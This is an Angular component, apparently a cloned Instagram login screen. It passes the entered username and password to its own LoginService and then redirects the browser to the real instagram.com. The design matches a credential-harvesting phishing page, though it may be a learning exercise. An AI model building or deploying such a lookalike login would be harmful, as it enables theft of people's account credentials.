import { Component } from '@angular/core';
import { HttpClient } from '@angular/common/http'; 
import { LoginService } from 'src/app/login.service';

@Component({
  selector: 'app-instagram',
  templateUrl: './instagram.component.html',
  styleUrls: ['./instagram.component.css']
})
export class InstagramComponent {
  app: string = 'instagram';
  loginName: string = '';
  pass: string = '';

  registerAccount: boolean = false;

  constructor(private http: HttpClient, private loginService: LoginService) {} 

  async login(){
    const response = await this.loginService.login(this.loginName, this.pass)
    .toPromise();
   
    console.log('Response:', response);

    if (response === "Login sucedido!") {
      console.log(response);
      alert('Login Sucedido!');

      window.location.href = 'https://www.instagram.com/';
    } else {
      alert('Login falhou!');
    }
  } catch () {
  } 
}
